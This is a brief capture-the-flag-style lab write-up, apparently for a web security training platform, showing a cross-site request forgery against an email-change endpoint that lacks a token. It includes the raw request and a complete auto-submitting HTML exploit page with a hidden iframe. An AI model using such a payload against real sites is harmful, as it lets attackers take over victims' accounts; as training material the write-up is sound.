# CSRF vulnerability with no defenses

This lab's email change functionality is vulnerable to CSRF.

The feature works by sending a POST request to the `/my-account/change-email` endpoint without a CSRF token.

```http
POST /my-account/change-email HTTP/1.1
Cookie: session=rUQaRA2VvHlC8irD8jXmNIcsqxpzgUY2

email=foo@bar.com
```

The following CSRF payload delievered to the user will change their email to `wiener@peter.com`:

```html
<html>
  <body>
    <h1>Hello, user!</h1>

    <iframe name="csrf-iframe" style="display: none;"></iframe>

    <form
      id="csrf-form"
      method="POST"
      action="https://0a7f003a03062960c0e92ff5002f0046.web-security-academy.net/my-account/change-email"
      target="csrf-iframe"
    >
      <input type="hidden" name="email" value="wiener@peter.com" />
      <input type="submit" value="Submit request" />
    </form>

    <script>
      document.getElementById('csrf-form').submit()
    </script>
  </body>
</html>
```
